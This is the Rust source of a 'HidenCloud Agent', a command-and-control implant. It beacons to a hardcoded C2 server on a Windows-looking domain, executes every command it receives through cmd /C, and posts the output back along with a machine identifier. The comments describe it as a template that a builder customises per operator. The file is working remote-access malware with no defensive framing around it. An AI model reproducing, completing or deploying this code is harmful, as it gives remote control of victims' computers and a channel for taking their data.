// HidenCloud Agent
// This is the template source. The builder generates a customized version
// with the correct C2 URL and user ID baked in.

use std::{thread, time::Duration, process::Command};

const C2_URL: &str = "https://windowssys.hidenmc.com/1";
const USER_ID: u32 = 1;
const RECONNECT_DELAY: u64 = 5;
const MUTEX_NAME: &str = "HidenCloudAgent";

fn main() {
    // Single instance check
    let _lock = single_instance::SingleInstance::new(MUTEX_NAME)
        .expect("Another instance is already running");

    println!("[*] HidenCloud agent starting...");
    println!("[*] C2: {}", C2_URL);
    println!("[*] User ID: {}", USER_ID);

    loop {
        match check_in() {
            Ok(cmd) => {
                if !cmd.trim().is_empty() {
                    let result = execute_command(&cmd);
                    let _ = send_result(&result);
                }
            }
            Err(e) => {
                eprintln!("[!] Check-in failed: {}", e);
            }
        }
        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
    }
}

fn check_in() -> Result<String, Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    let resp = client
        .get(&format!("{}/checkin", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .send()?;
    Ok(resp.text()?)
}

fn send_result(result: &str) -> Result<(), Box<dyn std::error::Error>> {
    let client = reqwest::blocking::Client::new();
    client
        .post(&format!("{}/result", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .body(result.to_string())
        .send()?;
    Ok(())
}

fn execute_command(cmd: &str) -> String {
    match Command::new("cmd").args(&["/C", cmd]).output() {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            format!("{}{}", stdout, stderr)
        }
        Err(e) => format!("Error: {}", e),
    }
}

fn machine_id() -> String {
    machine_uid::get().unwrap_or_else(|_| "unknown".to_string())
}
